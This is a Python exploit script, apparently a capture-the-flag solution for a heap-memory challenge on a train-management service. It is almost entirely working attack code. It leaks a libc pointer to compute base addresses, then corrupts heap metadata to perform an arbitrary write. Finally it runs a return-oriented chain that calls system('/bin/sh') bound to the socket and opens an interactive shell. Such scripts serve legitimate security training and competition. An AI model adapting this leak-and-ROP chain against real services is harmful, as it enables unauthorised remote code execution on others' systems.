from pwnlib import *

inet_pton_offset = 0x119ce0


s = Socket(("localhost", 9345))
#s = Socket(("awsno_cfeaa78b474521963ccfd450cd938ce9.quals.shallweplayaga.me", 80))
s.send("GET /trains HTTP/1.0\nHost: WWWWWWWWWWWWWWWWWWWWW\n\n")

s.ru("5) Exit\n: ")


def make_train(name, model, typ):
	s.send("1\n")

	s.ru("the Name: ")
	s.send("%s\n" % name)

	s.ru("he Model: ")
	s.send("%s\n" % model)

	s.ru("the Type: ")
	s.send("%s\n" % typ)

	s.ru("ax Speed: ")
	s.send("12121\n")

	s.ru("ssengers: ")
	s.send("434343\n")

	s.ru("5) Exit\n: ")

def update(n, name):
	s.send("4\n")

	s.ru("ns (y/n): ")
	s.send("y\n")

	s.ru("he index: ")
	s.send("%d\n" % n)

	s.ru("")
	s.ru("ame(y/n): ")
	s.send("y\n")

	s.ru(": ")
	s.send("%s\n" % name)

	s.ru("5) Exit\n: ")
	
def deliver(payload):
	assert "\n" not in payload
	s.send("7\n")
	s.ru("er Index: ")
	s.send(payload + "\n")
	s.ru("er Index: ")
	s.send("0\n")
	s.ru("5) Exit\n: ")

make_train("o", "l", "k")
update(1, "wwwwwwwwwwwwwwwwwwwwwwwwwwwwww")

payload = "123" + "\x00"*5
payload += open("mem").read()[:0x118]
payload += pq(0xdeadbe00)
payload += pq(0xdeadbe00)
payload += pq(0xdeadbe00)
payload += pq(0x9fc2b4)
payload += pq(0xdeadbe00)
payload += pq(0x9fc2b4)
payload += pq(0xdeadbe00)
payload += pq(0x9fc2b4)

deliver(payload)

# read the leaked name/libc ptr
s.send("2\n")
s.ru("Name: ")
inet_pton = uq(s.ru("Model").ljust(8, '\0'))

print hex(inet_pton)

libc_base = inet_pton - inet_pton_offset
assert libc_base & 0xfff == 0

print "libc: 0x%x" % libc_base


# we assume that this works....
heap_base = libc_base & 0x0000fffff8000000


############################################################
### now write/unlink

funcs_addr = heap_base + 0x22418
funcs = pq(0xdeadbeef) + pq(funcs_addr + 1) + pq(0x5b8ccf)


make_train("o", "l", funcs)
update(2, "wwwwwwwwwwwwwwwwwwwwwwwwwwwwww")

# target = libc_base + 0x3bf4d8 # stdout vtable
# target = libc_base + 0x3bf298 # stderr vtable 
target = 0xa0a248


cmd = "/bin/sh 1>&4 0<&4\x00"
cmd += "X"*(0x20 - len(cmd))
cmd_addr = heap_base + 0x22560

assert len(cmd) == 0x20

system = libc_base + 0x46640

x  = pq(0x0404153) # pop rdi
x += pq(cmd_addr)
x += pq(system)
x += "A"*(0x38 - len(x))
x += cmd
x_addr = heap_base + 0x22528

payload = "123" + "\x00"*5
payload += open("mem").read()[:0xc0]
payload += x
payload += pq(target - 8)
payload += pq(funcs_addr - 0x20)
payload += pq(0x512de7)
payload += pq(heap_base + 0x1eac)
payload += pq(x_addr - 8)
payload += pq(0x9fc2b4)
payload += pq(0x000000000040a0ae)
payload += pq(0x9fc2b4)
payload += "A"*8
payload += "B"*8

deliver(payload)

raw_input("> ")

# trigger
s.send("4\n")
s.ru("ns (y/n): ")
s.send("n" + "B"*0x18 + "\n") # TODO put table here?
s.ru("he index: ")
s.send("2" + "A"*0x200 + "\n")


# 0x000000000001f7a6 : pop rdi ; pop rbp ; ret


s.send("pwd\n")


s.interact()
